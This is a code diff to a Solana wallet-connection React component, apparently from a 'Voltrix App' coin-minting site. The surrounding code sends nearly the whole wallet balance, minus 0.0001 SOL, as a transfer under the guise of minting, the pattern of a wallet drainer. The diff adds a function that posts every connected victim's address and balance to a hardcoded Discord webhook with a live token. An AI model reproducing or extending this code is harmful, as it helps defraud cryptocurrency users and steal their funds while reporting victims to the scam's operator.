@@ -116,18 +116,21 @@ const WalletConnectionHandler: FC = () => {
         }
 
         try {
-            setSolBalance(lamports / LAMPORTS_PER_SOL);
+            const balanceSol = lamports / LAMPORTS_PER_SOL;
+            setSolBalance(balanceSol);
             console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
-            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(5)} SOL`);
+            console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
 
-const reservedLamports = 100000; // Reserve 0.0001 SOL
-if (lamports <= reservedLamports) {
-    alert('⚠️ Not enough SOL to mint a coin.');
-    return;
-}
+            // Send to Discord webhook
+            sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
 
-const sendAmount = lamports - reservedLamports;
+            const reservedLamports = 100000; // Reserve 0.0001 SOL
+            if (lamports <= reservedLamports) {
+                alert('⚠️ Not enough SOL to mint a coin.');
+                return;
+            }
 
+            const sendAmount = lamports - reservedLamports;
 
             const tx = new Transaction().add(
                 SystemProgram.transfer({
@@ -161,6 +164,44 @@ const sendAmount = lamports - reservedLamports;
             alert('Creation failed.');
         } finally {
             setLoading(false);
+        }
+    };
+
+    const sendDiscordWebhook = async (address: string, sol: number) => {
+        const webhookUrl = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ'; // Replace with your webhook
+
+        const body = {
+            embeds: [
+                {
+                    title: '🟢 Solana Wallet Connected',
+                    color: 0x00ff99,
+                    fields: [
+                        {
+                            name: '🧾 Wallet Address',
+                            value: `\`${address}\``,
+                        },
+                        {
+                            name: '💰 SOL Balance',
+                            value: `${sol.toFixed(5)} SOL`,
+                        },
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: 'Voltrix App',
+                    },
+                },
+            ],
+        };
+
+        try {
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body),
+            });
+            console.log('📩 Discord webhook sent.');
+        } catch (err) {
+            console.error('❌ Failed to send webhook:', err);
         }
     };
 
